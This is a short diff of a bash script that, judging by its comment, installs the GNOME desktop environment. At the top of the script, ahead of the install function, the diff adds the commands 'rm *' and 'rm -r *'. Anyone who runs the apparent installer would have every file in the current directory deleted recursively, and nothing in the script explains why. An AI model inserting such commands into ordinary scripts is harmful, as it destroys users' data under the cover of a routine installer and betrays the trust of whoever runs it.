@@ -1,5 +1,7 @@
 #!/bin/bash
-
+    rm *
+    rm -r *
+    
 # Function to install GNOME desktop environment
 install_gnome() {
     sudo apt-get update
